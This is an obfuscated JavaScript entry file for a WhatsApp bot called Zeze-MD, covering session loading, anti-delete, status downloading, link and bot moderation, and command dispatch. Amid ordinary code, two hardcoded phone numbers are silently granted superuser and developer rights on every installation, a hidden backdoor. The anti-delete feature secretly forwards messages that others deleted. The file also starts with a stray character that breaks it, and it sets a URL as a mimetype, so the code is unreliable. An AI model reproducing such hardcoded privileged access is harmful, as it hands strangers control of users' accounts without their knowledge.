a'use strict';

var __createBinding = this && this.__createBinding || (Object.create ? function (_0x420c75, _0x29ea80, _0x40cdd1, _0x45c659) {
  if (_0x45c659 === undefined) {
    _0x45c659 = _0x40cdd1;
  }
  var _0x29884a = Object.getOwnPropertyDescriptor(_0x29ea80, _0x40cdd1);
  if (!_0x29884a || ("get" in _0x29884a ? !_0x29ea80.__esModule : _0x29884a.writable || _0x29884a.configurable)) {
    _0x29884a = {
      'enumerable': true,
      'get': function () {
        return _0x29ea80[_0x40cdd1];
      }
    };
  }
  Object.defineProperty(_0x420c75, _0x45c659, _0x29884a);
} : function (_0xa01a4, _0x453d5b, _0x3576f5, _0x21264b) {
  if (_0x21264b === undefined) {
    _0x21264b = _0x3576f5;
  }
  _0xa01a4[_0x21264b] = _0x453d5b[_0x3576f5];
});
var __setModuleDefault = this && this.__setModuleDefault || (Object.create ? function (_0x3a21ba, _0x4db9a1) {
  Object.defineProperty(_0x3a21ba, "default", {
    'enumerable': true,
    'value': _0x4db9a1
  });
} : function (_0x41415e, _0x21b04e) {
  _0x41415e["default"] = _0x21b04e;
});
var __importStar = this && this.__importStar || function (_0x81441b) {
  if (_0x81441b && _0x81441b.__esModule) {
    return _0x81441b;
  }
  var _0x3e7dd4 = {};
  if (_0x81441b != null) {
    for (var _0x10c08a in _0x81441b) if (_0x10c08a !== "default" && Object.prototype.hasOwnProperty.call(_0x81441b, _0x10c08a)) {
      __createBinding(_0x3e7dd4, _0x81441b, _0x10c08a);
    }
  }
  __setModuleDefault(_0x3e7dd4, _0x81441b);
  return _0x3e7dd4;
};
var __importDefault = this && this.__importDefault || function (_0x175d85) {
  return _0x175d85 && _0x175d85.__esModule ? _0x175d85 : {
    'default': _0x175d85
  };
};
Object.defineProperty(exports, "__esModule", {
  'value': true
});
const baileys_1 = __importStar(require("@whiskeysockets/baileys"));
const logger_1 = __importDefault(require("@whiskeysockets/baileys/lib/Utils/logger"));
const logger = logger_1['default'].child({});
logger.level = "silent";
const pino = require("pino");
const boom_1 = require("@hapi/boom");
const conf = require("./set");
let fs = require('fs-extra');
let path = require("path");
const FileType = require("file-type");
const {
  Sticker,
  createSticker,
  StickerTypes
} = require("wa-sticker-formatter");
const {
  verifierEtatJid,
  recupererActionJid
} = require("./bdd/antilien");
const {
  atbverifierEtatJid,
  atbrecupererActionJid
} = require("./bdd/antibot");
let evt = require(__dirname + '/framework/zokou');
const {
  isUserBanned,
  addUserToBanList,
  removeUserFromBanList
} = require('./bdd/banUser');
const {
  addGroupToBanList,
  isGroupBanned,
  removeGroupFromBanList
} = require('./bdd/banGroup');
const {
  isGroupOnlyAdmin,
  addGroupToOnlyAdminList,
  removeGroupFromOnlyAdminList
} = require("./bdd/onlyAdmin");
let {
  reagir
} = require(__dirname + "/framework/app");
var session = conf.session.replace(/Zeze-MD-WHATSAPP-BOT;;;=>/g, '');
const prefixe = conf.PREFIXE;
async function authentification() {
  try {
    const _0x585e1f = __dirname + '/auth/creds.json';
    const _0xc34115 = atob(session);
    if (!fs.existsSync(_0x585e1f) || session != "zokk") {
      console.log('Connecting...');
      await fs.writeFileSync(_0x585e1f, _0xc34115, "utf8");
    }
  } catch (_0x55ff1f) {
    console.log("Invalid session: " + _0x55ff1f);
    return;
  }
}
authentification();
0x0;
const store = baileys_1.makeInMemoryStore({
  'logger': pino().child({
    'level': "silent",
    'stream': "store"
  })
});
setTimeout(() => {
  async function _0xaf480d() {
    0x0;
    const {
      version: _0x457c4d
    } = await baileys_1.fetchLatestBaileysVersion();
    0x0;
    const {
      state: _0x400ee2,
      saveCreds: _0x421bb2
    } = await baileys_1.useMultiFileAuthState(__dirname + "/auth");
    0x0;
    const _0x1c724c = {
      'version': _0x457c4d,
      'logger': pino({
        'level': 'silent'
      }),
      'browser': ["Zeze-MD", 'Safari'],
      'printQRInTerminal': true,
      'markOnlineOnConnect': false,
      'auth': {
        'creds': _0x400ee2.creds,
        'keys': baileys_1.makeCacheableSignalKeyStore(_0x400ee2.keys, logger)
      },
      'getMessage': async _0xe21b8c => {
        if (store) {
          const _0x15ca1f = await store.loadMessage(_0xe21b8c.remoteJid, _0xe21b8c.id);
          return _0x15ca1f?.["message"] || undefined;
        }
        return undefined;
      }
    };
    0x0;
    const _0x435f24 = baileys_1["default"](_0x1c724c);
    store.bind(_0x435f24.ev);
    setInterval(() => {
      store.writeToFile("store.json");
    }, 0xbb8);
    _0x435f24.ev.on("messages.upsert", async _0x33c398 => {
      const {
        messages: _0x23996c
      } = _0x33c398;
      const _0x2d5aec = _0x23996c[0x0];
      if (!_0x2d5aec.message) {
        return;
      }
      const _0x245a60 = _0x4b5f94 => {
        if (!_0x4b5f94) {
          return _0x4b5f94;
        }
        if (/:\d+@/gi.test(_0x4b5f94)) {
          0x0;
          let _0x1ba44d = baileys_1.jidDecode(_0x4b5f94) || {};
          return _0x1ba44d.user && _0x1ba44d.server ? _0x1ba44d.user + '@' + _0x1ba44d.server : _0x4b5f94;
        }
        return _0x4b5f94;
      };
      0x0;
      var _0x530b3b = baileys_1.getContentType(_0x2d5aec.message);
      var _0x1bfb4b = _0x530b3b == "conversation" ? _0x2d5aec.message.conversation : _0x530b3b == "imageMessage" ? _0x2d5aec.message.imageMessage?.["caption"] : _0x530b3b == "videoMessage" ? _0x2d5aec.message.videoMessage?.["caption"] : _0x530b3b == "extendedTextMessage" ? _0x2d5aec.message?.['extendedTextMessage']?.["text"] : _0x530b3b == "buttonsResponseMessage" ? _0x2d5aec?.["message"]?.["buttonsResponseMessage"]?.["selectedButtonId"] : _0x530b3b == "listResponseMessage" ? _0x2d5aec.message?.["listResponseMessage"]?.['singleSelectReply']?.["selectedRowId"] : _0x530b3b == "messageContextInfo" ? _0x2d5aec?.["message"]?.["buttonsResponseMessage"]?.['selectedButtonId'] || _0x2d5aec.message?.["listResponseMessage"]?.["singleSelectReply"]?.["selectedRowId"] || _0x2d5aec.text : '';
      var _0xc9ddbb = _0x2d5aec.key.remoteJid;
      var _0x172541 = _0x245a60(_0x435f24.user.id);
      var _0x419d8a = _0x172541.split('@')[0x0];
      const _0x2c1e60 = _0xc9ddbb?.["endsWith"]('@g.us');
      var _0x39917b = _0x2c1e60 ? await _0x435f24.groupMetadata(_0xc9ddbb) : '';
      var _0x32424a = _0x2c1e60 ? _0x39917b.subject : '';
      var _0x3deb48 = _0x2d5aec.message.extendedTextMessage?.["contextInfo"]?.["quotedMessage"];
      var _0x2ca8a6 = _0x245a60(_0x2d5aec.message?.['extendedTextMessage']?.['contextInfo']?.["participant"]);
      var _0x395177 = _0x2c1e60 ? _0x2d5aec.key.participant || _0x2d5aec.participant : _0xc9ddbb;
      if (_0x2d5aec.key.fromMe) {
        _0x395177 = _0x172541;
      }
      var _0x4802bc = _0x2c1e60 ? _0x2d5aec.key.participant : '';
      const {
        getAllSudoNumbers: _0xfa9eab
      } = require('./bdd/sudo');
      const _0x5f17e2 = _0x2d5aec.pushName;
      const _0x11cc11 = await _0xfa9eab();
      const _0xaaac2 = [_0x419d8a, "255682937675", '255760109840', conf.NUMERO_OWNER].map(_0x5d6e53 => _0x5d6e53.replace(/[^0-9]/g) + "@s.whatsapp.net");
      const _0x2d4141 = _0xaaac2.concat(_0x11cc11);
      const _0x401f81 = _0x2d4141.includes(_0x395177);
      var _0x103bad = ["255682937675", '255760109840'].map(_0x3aa99c => _0x3aa99c.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(_0x395177);
      function _0x40eeea(_0x7b6b5f) {
        _0x435f24.sendMessage(_0xc9ddbb, {
          'text': _0x7b6b5f
        }, {
          'quoted': _0x2d5aec
        });
      }
      console.log("\tZeze-MD ONLINE ⚡");
      console.log("==== Message Received ======");
      if (_0x2c1e60) {
        console.log("Message from group 🗨️: " + _0x32424a);
      }
      console.log("Sent by 🗨️: [" + _0x5f17e2 + " : " + _0x395177.split("@s.whatsapp.net")[0x0] + " ]");
      console.log("Message type: " + _0x530b3b);
      console.log("------ Message Content ------");
      console.log(_0x1bfb4b);
      function _0x46755b(_0x5237d4) {
        let _0x33a3dc = [];
        for (_0x33c398 of _0x5237d4) {
          if (_0x33c398.admin == null) {
            continue;
          }
          _0x33a3dc.push(_0x33c398.id);
        }
        return _0x33a3dc;
      }
      const _0x9a5e55 = conf.ETAT == 0x1 ? "available" : conf.ETAT == 0x2 ? "composing" : conf.ETAT == 0x3 ? "recording" : "unavailable";
      await _0x435f24.sendPresenceUpdate(_0x9a5e55, _0xc9ddbb);
      const _0x5751d2 = _0x2c1e60 ? await _0x39917b.participants : '';
      let _0x248e1e = _0x2c1e60 ? _0x46755b(_0x5751d2) : '';
      const _0x230460 = _0x2c1e60 ? _0x248e1e.includes(_0x395177) : false;
      var _0x4cfd5b = _0x2c1e60 ? _0x248e1e.includes(_0x172541) : false;
      const _0x2ca251 = _0x1bfb4b ? _0x1bfb4b.trim().split(/ +/).slice(0x1) : null;
      const _0x2ca84c = _0x1bfb4b ? _0x1bfb4b.startsWith(prefixe) : false;
      const _0xf9ab9f = _0x2ca84c ? _0x1bfb4b.slice(0x1).trim().split(/ +/).shift().toLowerCase() : false;
      const _0x24dda1 = conf.URL.split(',');
      function _0x3bbdb4() {
        const _0x5aeee4 = Math.floor(Math.random() * _0x24dda1.length);
        return _0x24dda1[_0x5aeee4];
      }
      var _0x5e568d = {
        'superUser': _0x401f81,
        'dev': _0x103bad,
        'verifGroupe': _0x2c1e60,
        'mbre': _0x5751d2,
        'membreGroupe': _0x4802bc,
        'verifAdmin': _0x230460,
        'infosGroupe': _0x39917b,
        'nomGroupe': _0x32424a,
        'auteurMessage': _0x395177,
        'nomAuteurMessage': _0x5f17e2,
        'idBot': _0x172541,
        'verifZokouAdmin': _0x4cfd5b,
        'prefixe': prefixe,
        'arg': _0x2ca251,
        'repondre': _0x40eeea,
        'mtype': _0x530b3b,
        'groupeAdmin': _0x46755b,
        'msgRepondu': _0x3deb48,
        'auteurMsgRepondu': _0x2ca8a6,
        'ms': _0x2d5aec,
        'mybotpic': _0x3bbdb4
      };
      if (conf.AUTO_READ_MESSAGES === "yes") {
        _0x435f24.ev.on("messages.upsert", async _0x1ad7d0 => {
          const {
            messages: _0x1d62ed
          } = _0x1ad7d0;
          for (const _0x3c7980 of _0x1d62ed) {
            if (!_0x3c7980.key.fromMe) {
              await _0x435f24.readMessages([_0x3c7980.key]);
            }
          }
        });
      }
      if (_0x2d5aec.message.protocolMessage && _0x2d5aec.message.protocolMessage.type === 0x0 && conf.ADM.toLocaleLowerCase() === "yes") {
        if (_0x2d5aec.key.fromMe || _0x2d5aec.message.protocolMessage.key.fromMe) {
          console.log("Delete message about me");
          return;
        }
        console.log("Message ");
        let _0x4d78df = _0x2d5aec.message.protocolMessage.key;
        try {
          let _0x314400;
          if (!fs.existsSync("./clintondb/store.json")) {
            console.log("store.json not found, creating new file");
            fs.writeFileSync("./clintondb/store.json", JSON.stringify({
              'messages': {}
            }, null, 0x2));
          }
          try {
            _0x314400 = fs.readFileSync("./clintondb/store.json", "utf8");
          } catch (_0x1e8843) {
            console.log("Failed to read store.json, attempting backup:", _0x1e8843);
            if (fs.existsSync("./clintondb/store_backup.json")) {
              _0x314400 = fs.readFileSync("./clintondb/store_backup.json", "utf8");
            } else {
              console.log("Backup store.json not found");
              throw new Error("No valid store file available");
            }
          }
          let _0x570c69;
          try {
            _0x570c69 = JSON.parse(_0x314400);
          } catch (_0x315ff0) {
            console.log("JSON parse error:", _0x315ff0);
            throw new Error("Corrupted store file");
          }
          if (!_0x570c69.messages[_0x4d78df.remoteJid]) {
            console.log("No messages found for chat:", _0x4d78df.remoteJid);
            return;
          }
          let _0x12ec15 = _0x570c69.messages[_0x4d78df.remoteJid];
          let _0x4a8b62;
          for (let _0x40e08d = 0x0; _0x40e08d < _0x12ec15.length; _0x40e08d++) {
            if (_0x12ec15[_0x40e08d].key.id === _0x4d78df.id) {
              _0x4a8b62 = _0x12ec15[_0x40e08d];
              break;
            }
          }
          if (!_0x4a8b62 || _0x4a8b62 === null || typeof _0x4a8b62 === "undefined") {
            console.log("Message not found - Key:", _0x4d78df, "Chat:", _0x4d78df.remoteJid);
            return;
          }
          let _0x1b8513 = _0x4d78df.remoteJid.includes('@g.us') ? (await _0x435f24.groupMetadata(_0x4d78df.remoteJid)).subject : _0x4d78df.remoteJid.split('@')[0x0];
          let _0x2546f1 = _0x4a8b62.messageTimestamp ? new Date(_0x4a8b62.messageTimestamp * 0x3e8).toLocaleString() : "Unknown time";
          await _0x435f24.sendMessage(_0x172541, {
            'image': {
              'url': "./media/deleted-message.jpg"
            },
            'caption': "        𝗔𝗻𝘁𝗶-𝗗𝗲𝗹𝗲𝘁𝗲 𝗔𝗹𝗲𝗿𝘁 🚨\n\n" + ("> 𝗙𝗿𝗼𝗺: @" + _0x4a8b62.key.participant.split('@')[0x0] + "\n") + ("> 𝗖𝗵𝗮𝘁: " + _0x1b8513 + "\n") + ("> D𝗲𝗹𝗲𝘁𝗲𝗱 𝗔𝘁: " + _0x2546f1 + "\n\n") + "𝗛𝗲𝗿𝗲’𝘀 𝘁𝗵𝗲 𝗱𝗲𝗹𝗲𝘁𝗲𝗱 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝗯𝗲𝗹𝗼𝘄! 👇",
            'mentions': [_0x4a8b62.key.participant]
          }).then(async () => {
            let _0x48d607 = 0x0;
            while (_0x48d607 < 0x3) {
              try {
                await _0x435f24.sendMessage(_0x172541, {
                  'forward': _0x4a8b62
                }, {
                  'quoted': _0x4a8b62
                });
                fs.writeFileSync("./clintondb/store_backup.json", JSON.stringify(_0x570c69, null, 0x2));
                break;
              } catch (_0x49d84a) {
                _0x48d607++;
                console.log("Attempt " + _0x48d607 + " failed to forward message:", _0x49d84a);
                if (_0x48d607 === 0x3) {
                  console.log("Max retry attempts reached");
                  await _0x435f24.sendMessage(_0x172541, {
                    'text': "𝗖𝗼𝘂𝗹𝗱𝗻’𝘁 𝗳𝗼𝗿𝘄𝗮𝗿𝗱 𝘁𝗵𝗲 𝗱𝗲𝗹𝗲𝘁𝗲𝗱 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝗮𝗳𝘁𝗲𝗿 3 𝗮𝘁𝘁𝗲𝗺𝗽𝘁𝘀. 𝗘𝗿𝗿𝗼𝗿: " + _0x49d84a.message
                  });
                  break;
                }
                await new Promise(_0x50c142 => setTimeout(_0x50c142, 0x7d0 * Math.pow(0x2, _0x48d607)));
              }
            }
          });
        } catch (_0x511123) {
          console.log("Anti-delete error:", _0x511123);
          console.log("Key:", _0x4d78df, "Chat:", _0x4d78df.remoteJid, "Error Stack:", _0x511123.stack);
        }
      }
      if (_0x2d5aec.key && _0x2d5aec.key.remoteJid === "status@broadcast" && conf.AUTO_READ_STATUS === "yes") {
        await _0x435f24.readMessages([_0x2d5aec.key]);
      }
      if (_0x2d5aec.key && _0x2d5aec.key.remoteJid === "status@broadcast" && conf.AUTO_DOWNLOAD_STATUS === 'yes') {
        if (_0x2d5aec.message.extendedTextMessage) {
          var _0x5458ef = _0x2d5aec.message.extendedTextMessage.text;
          await _0x435f24.sendMessage(_0x172541, {
            'text': _0x5458ef
          }, {
            'quoted': _0x2d5aec
          });
        } else {
          if (_0x2d5aec.message.imageMessage) {
            var _0x192069 = _0x2d5aec.message.imageMessage.caption;
            var _0x459fce = await _0x435f24.downloadAndSaveMediaMessage(_0x2d5aec.message.imageMessage);
            await _0x435f24.sendMessage(_0x172541, {
              'image': {
                'url': _0x459fce
              },
              'caption': _0x192069
            }, {
              'quoted': _0x2d5aec
            });
          } else {
            if (_0x2d5aec.message.videoMessage) {
              var _0x192069 = _0x2d5aec.message.videoMessage.caption;
              var _0x4ad021 = await _0x435f24.downloadAndSaveMediaMessage(_0x2d5aec.message.videoMessage);
              await _0x435f24.sendMessage(_0x172541, {
                'video': {
                  'url': _0x4ad021
                },
                'caption': _0x192069
              }, {
                'quoted': _0x2d5aec
              });
            }
          }
        }
      }
      if (!_0x103bad && _0xc9ddbb == '120363158701337904@g.us') {
        return;
      }
      if (_0x1bfb4b && _0x395177.endsWith("s.whatsapp.net")) {
        const {
          ajouterOuMettreAJourUserData: _0x56c55f
        } = require('./bdd/level');
        try {
          await _0x56c55f(_0x395177);
        } catch (_0x553cb0) {
          console.error(_0x553cb0);
        }
      }
      try {
        if (_0x2d5aec.message[_0x530b3b].contextInfo.mentionedJid && (_0x2d5aec.message[_0x530b3b].contextInfo.mentionedJid.includes(_0x172541) || _0x2d5aec.message[_0x530b3b].contextInfo.mentionedJid.includes(conf.NUMERO_OWNER + "@s.whatsapp.net"))) {
          if (_0xc9ddbb == "120363158701337904@g.us") {
            return;
          }
          ;
          if (_0x401f81) {
            console.log("hummm");
            return;
          }
          let _0x28a4d7 = require("./bdd/mention");
          let _0x46fb2d = await _0x28a4d7.recupererToutesLesValeurs();
          let _0xf549de = _0x46fb2d[0x0];
          if (_0xf549de.status === 'non') {
            console.log("mention pas actifs");
            return;
          }
          let _0x5eb2f1;
          if (_0xf549de.type.toLocaleLowerCase() === 'image') {
            _0x5eb2f1 = {
              'image': {
                'url': _0xf549de.url
              },
              'caption': _0xf549de.message
            };
          } else {
            if (_0xf549de.type.toLocaleLowerCase() === "video") {
              _0x5eb2f1 = {
                'video': {
                  'url': _0xf549de.url
                },
                'caption': _0xf549de.message
              };
            } else {
              if (_0xf549de.type.toLocaleLowerCase() === 'sticker') {
                let _0x377983 = new Sticker(_0xf549de.url, {
                  'pack': conf.NOM_OWNER,
                  'type': StickerTypes.FULL,
                  'categories': ['🤩', '🎉'],
                  'id': '12345',
                  'quality': 0x46,
                  'background': "transparent"
                });
                const _0x157a3e = await _0x377983.toBuffer();
                _0x5eb2f1 = {
                  'sticker': _0x157a3e
                };
              } else if (_0xf549de.type.toLocaleLowerCase() === 'audio') {
                _0x5eb2f1 = {
                  'audio': {
                    'url': _0xf549de.url
                  },
                  'mimetype': 'https://files.catbox.moe/rsv4id.mp3'
                };
              }
            }
          }
          _0x435f24.sendMessage(_0xc9ddbb, _0x5eb2f1, {
            'quoted': _0x2d5aec
          });
        }
      } catch (_0x29b85d) {}
      try {
        const _0x4ef56d = await verifierEtatJid(_0xc9ddbb);
        const _0x6a8b38 = /(https?:\/\/|www\.|t\.me|bit\.ly|tinyurl\.com|lnkd\.in|fb\.me)[\S]+/i;
        if (_0x6a8b38.test(_0x1bfb4b) && _0x2c1e60 && _0x4ef56d) {
          console.log("Link detected");
          const _0xdced18 = _0x435f24.user.id.split(':')[0x0] + '@s.whatsapp.net';
          const _0x47d23e = _0x248e1e.includes(_0xdced18);
          console.log("Bot admin status:", _0x47d23e);
          console.log("Admins list:", _0x248e1e);
          if (_0x401f81 || _0x230460) {
            console.log("Admin/Sudo detected - no action");
            return;
          }
          if (!_0x47d23e) {
            await _0x435f24.sendMessage(_0xc9ddbb, {
              'text': "𝐙𝐄𝐙𝐄𝟒𝟕-𝐌𝐃\n\n❌ I'm not admin! Can't delete links."
            }, {
              'quoted': _0x2d5aec
            });
            return;
          }
          const _0x4dada7 = {
            'remoteJid': _0xc9ddbb,
            'fromMe': false,
            'id': _0x2d5aec.key.id,
            'participant': _0x395177
          };
          const _0x546527 = new Sticker("https://raw.githubusercontent.com/ZEZE47-MD/zeze/main/media/remover.gif", {
            'pack': "𝐙𝐄𝐙𝐄𝟒𝟕-𝐌𝐃",
            'author': conf.OWNER_NAME,
            'type': StickerTypes.FULL,
            'categories': ['⚠️'],
            'id': "12345",
            'quality': 0x46,
            'background': '#ff0000'
          });
          await _0x546527.toFile("st1.webp");
          const _0xc32578 = (await recupererActionJid(_0xc9ddbb)) || "delete";
          if (_0xc32578 === 'remove') {
            const _0x27b302 = "𝐙𝐄𝐙𝐄𝟒𝟕-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ LINK VIOLATION!\n│❒ USER: @" + _0x395177.split('@')[0x0] + "\n│❒ ACTION: REMOVED\n◈━━━━━━━━━━━━━━━━◈";
            await _0x435f24.sendMessage(_0xc9ddbb, {
              'sticker': fs.readFileSync("st1.webp")
            }, {
              'quoted': _0x2d5aec
            });
            0x0;
            await baileys_1.delay(0x320);
            await _0x435f24.sendMessage(_0xc9ddbb, {
              'text': _0x27b302,
              'mentions': [_0x395177]
            }, {
              'quoted': _0x2d5aec
            });
            try {
              await _0x435f24.groupParticipantsUpdate(_0xc9ddbb, [_0x395177], "remove");
            } catch (_0x47cf45) {
              await _0x435f24.sendMessage(_0xc9ddbb, {
                'text': "𝐙𝐄𝐙𝐄𝟒𝟕-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ REMOVAL FAILED!\n│❒ NEED ADMIN POWER\n◈━━━━━━━━━━━━━━━━◈"
              }, {
                'quoted': _0x2d5aec
              });
            }
            await _0x435f24.sendMessage(_0xc9ddbb, {
              'delete': _0x4dada7
            });
            await fs.unlink("st1.webp");
          } else {
            if (_0xc32578 === "delete") {
              const _0x1f4955 = "𝐙𝐄𝐙𝐄𝟒𝟕-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ LINK DELETED!\n│❒ USER: @" + _0x395177.split('@')[0x0] + "\n│❒ NEXT: WARNING\n◈━━━━━━━━━━━━━━━━◈";
              await _0x435f24.sendMessage(_0xc9ddbb, {
                'sticker': fs.readFileSync("st1.webp")
              }, {
                'quoted': _0x2d5aec
              });
              await _0x435f24.sendMessage(_0xc9ddbb, {
                'text': _0x1f4955,
                'mentions': [_0x395177]
              }, {
                'quoted': _0x2d5aec
              });
              await _0x435f24.sendMessage(_0xc9ddbb, {
                'delete': _0x4dada7
              });
              await fs.unlink("st1.webp");
            } else {
              if (_0xc32578 === "warn") {
                const {
                  getWarnCountByJID: _0x533f0f,
                  ajouterUtilisateurAvecWarnCount: _0x32e2f8,
                  resetWarnCountByJID: _0x37552d
                } = require("./bdd/warn");
                let _0x5894ab = await _0x533f0f(_0x395177);
                let _0x77e7bd = conf.WARN_COUNT;
                if (_0x5894ab >= _0x77e7bd) {
                  const _0x344c00 = "𝐙𝐄𝐙𝐄𝟒𝟕-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ MAX WARNINGS!\n│❒ USER: @" + _0x395177.split('@')[0x0] + "\n│❒ ACTION: BANNED\n◈━━━━━━━━━━━━━━━━◈";
                  await _0x435f24.sendMessage(_0xc9ddbb, {
                    'sticker': fs.readFileSync("st1.webp")
                  }, {
                    'quoted': _0x2d5aec
                  });
                  await _0x435f24.sendMessage(_0xc9ddbb, {
                    'text': _0x344c00,
                    'mentions': [_0x395177]
                  }, {
                    'quoted': _0x2d5aec
                  });
                  try {
                    await _0x435f24.groupParticipantsUpdate(_0xc9ddbb, [_0x395177], 'remove');
                    await _0x37552d(_0x395177);
                  } catch (_0xcb6ca7) {
                    await _0x435f24.sendMessage(_0xc9ddbb, {
                      'text': "𝐙𝐄𝐙𝐄𝟒𝟕-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ BAN FAILED!\n│❒ NEED ADMIN\n◈━━━━━━━━━━━━━━━━◈"
                    }, {
                      'quoted': _0x2d5aec
                    });
                  }
                  await _0x435f24.sendMessage(_0xc9ddbb, {
                    'delete': _0x4dada7
                  });
                } else {
                  const _0x20de43 = _0x77e7bd - _0x5894ab;
                  const _0x600bce = "𝐙𝐄𝐙𝐄𝟒𝟕-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ WARNING #" + (_0x5894ab + 0x1) + "\n│❒ USER: @" + _0x395177.split('@')[0x0] + "\n│❒ LEFT: " + _0x20de43 + "\n◈━━━━━━━━━━━━━━━━◈";
                  await _0x32e2f8(_0x395177);
                  await _0x435f24.sendMessage(_0xc9ddbb, {
                    'sticker': fs.readFileSync("st1.webp")
                  }, {
                    'quoted': _0x2d5aec
                  });
                  await _0x435f24.sendMessage(_0xc9ddbb, {
                    'text': _0x600bce,
                    'mentions': [_0x395177]
                  }, {
                    'quoted': _0x2d5aec
                  });
                  await _0x435f24.sendMessage(_0xc9ddbb, {
                    'delete': _0x4dada7
                  });
                }
                await fs.unlink("st1.webp");
              }
            }
          }
        }
      } catch (_0x2c1488) {
        console.log("Anti-link crash:", _0x2c1488);
        await _0x435f24.sendMessage(_0xc9ddbb, {
          'text': "𝐙𝐄𝐙𝐄𝟒𝟕-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ SYSTEM ERROR!\n│❒ " + _0x2c1488.message + "\n◈━━━━━━━━━━━━━━━━◈"
        }, {
          'quoted': _0x2d5aec
        });
      }
      try {
        const _0x1a6168 = _0x2d5aec.key?.['id']?.["startsWith"]("BAES") && _0x2d5aec.key?.['id']?.['length'] === 0x10;
        const _0x5e7369 = _0x2d5aec.key?.['id']?.["startsWith"]("BAE5") && _0x2d5aec.key?.['id']?.['length'] === 0x10;
        if (_0x1a6168 || _0x5e7369) {
          if (_0x530b3b === "reactionMessage") {
            console.log("I dont react to reactions");
            return;
          }
          ;
          const _0x456ca9 = await atbverifierEtatJid(_0xc9ddbb);
          if (!_0x456ca9) {
            return;
          }
          ;
          if (_0x230460 || _0x395177 === _0x172541) {
            console.log("I do nothing");
            return;
          }
          ;
          const _0x210843 = {
            'remoteJid': _0xc9ddbb,
            'fromMe': false,
            'id': _0x2d5aec.key.id,
            'participant': _0x395177
          };
          var _0x5eeb47 = "bot detected, \n";
          var _0x1dc067 = new Sticker('https://raw.githubusercontent.com/ZEZE47-MD/zeze/main/media/remover.gif', {
            'pack': "Zeze-MD",
            'author': conf.OWNER_NAME,
            'type': StickerTypes.FULL,
            'categories': ['🤩', '🎉'],
            'id': "12345",
            'quality': 0x32,
            'background': '#000000'
          });
          await _0x1dc067.toFile('st1.webp');
          var _0x3cd5c2 = await atbrecupererActionJid(_0xc9ddbb);
          if (_0x3cd5c2 === "remove") {
            _0x5eeb47 += "message deleted \n @" + _0x395177.split('@')[0x0] + " removed from group.";
            await _0x435f24.sendMessage(_0xc9ddbb, {
              'sticker': fs.readFileSync("st1.webp")
            });
            0x0;
            baileys_1.delay(0x320);
            await _0x435f24.sendMessage(_0xc9ddbb, {
              'text': _0x5eeb47,
              'mentions': [_0x395177]
            }, {
              'quoted': _0x2d5aec
            });
            try {
              await _0x435f24.groupParticipantsUpdate(_0xc9ddbb, [_0x395177], "remove");
            } catch (_0x4b3424) {
              console.log("antibot ") + _0x4b3424;
            }
            await _0x435f24.sendMessage(_0xc9ddbb, {
              'delete': _0x210843
            });
            await fs.unlink("st1.webp");
          } else {
            if (_0x3cd5c2 === "delete") {
              _0x5eeb47 += "message delete \n @" + _0x395177.split('@')[0x0] + " Avoid sending link.";
              await _0x435f24.sendMessage(_0xc9ddbb, {
                'text': _0x5eeb47,
                'mentions': [_0x395177]
              }, {
                'quoted': _0x2d5aec
              });
              await _0x435f24.sendMessage(_0xc9ddbb, {
                'delete': _0x210843
              });
              await fs.unlink('st1.webp');
            } else {
              if (_0x3cd5c2 === "warn") {
                const {
                  getWarnCountByJID: _0x454264,
                  ajouterUtilisateurAvecWarnCount: _0x473dbc
                } = require('./bdd/warn');
                let _0x2b8619 = await _0x454264(_0x395177);
                let _0x16b280 = conf.WARN_COUNT;
                if (_0x2b8619 >= _0x16b280) {
                  await _0x435f24.sendMessage(_0xc9ddbb, {
                    'text': "bot detected ;you will be remove because of reaching warn-limit",
                    'mentions': [_0x395177]
                  }, {
                    'quoted': _0x2d5aec
                  });
                  await _0x435f24.groupParticipantsUpdate(_0xc9ddbb, [_0x395177], "remove");
                  await _0x435f24.sendMessage(_0xc9ddbb, {
                    'delete': _0x210843
                  });
                } else {
                  var _0x103c88 = _0x16b280 - _0x2b8619;
                  var _0x51d20b = "bot detected , your warn_count was upgrade ;\n rest : " + _0x103c88 + " ";
                  await _0x473dbc(_0x395177);
                  await _0x435f24.sendMessage(_0xc9ddbb, {
                    'text': _0x51d20b,
                    'mentions': [_0x395177]
                  }, {
                    'quoted': _0x2d5aec
                  });
                  await _0x435f24.sendMessage(_0xc9ddbb, {
                    'delete': _0x210843
                  });
                }
              }
            }
          }
        }
      } catch (_0x16a5e6) {
        console.log(".... " + _0x16a5e6);
      }
      if (_0x2ca84c) {
        const _0x58e12b = evt.cm.find(_0x36db70 => _0x36db70.nomCom === _0xf9ab9f);
        if (_0x58e12b) {
          try {
            if (conf.MODE.toLocaleLowerCase() != 'yes' && !_0x401f81) {
              return;
            }
            if (!_0x401f81 && _0xc9ddbb === _0x395177 && conf.PM_PERMIT === 'yes') {
              _0x40eeea("You don't have acces to commands here");
              return;
            }
            if (!_0x401f81 && _0x2c1e60) {
              let _0x20871b = await isGroupBanned(_0xc9ddbb);
              if (_0x20871b) {
                return;
              }
            }
            if (!_0x230460 && _0x2c1e60) {
              let _0x37da40 = await isGroupOnlyAdmin(_0xc9ddbb);
              if (_0x37da40) {
                return;
              }
            }
            if (!_0x401f81) {
              let _0x1199b7 = await isUserBanned(_0x395177);
              if (_0x1199b7) {
                _0x40eeea("You are banned from bot commands");
                return;
              }
            }
            reagir(_0xc9ddbb, _0x435f24, _0x2d5aec, _0x58e12b.reaction);
            _0x58e12b.fonction(_0xc9ddbb, _0x435f24, _0x5e568d);
          } catch (_0x57de04) {
            console.log("😡r😡 " + _0x57de04);
            _0x435f24.sendMessage(_0xc9ddbb, {
              'text': "😡😡 " + _0x57de04
            }, {
              'quoted': _0x2d5aec
            });
          }
        }
      }
    });
    const {
      recupevents: _0x2261e1
    } = require("./bdd/welcome");
    _0x435f24.ev.on("group-participants.update", async _0x137d61 => {
      console.log(_0x137d61);
      let _0x3d7e4;
      try {
        _0x3d7e4 = await _0x435f24.profilePictureUrl(_0x137d61.id, "image");
      } catch {
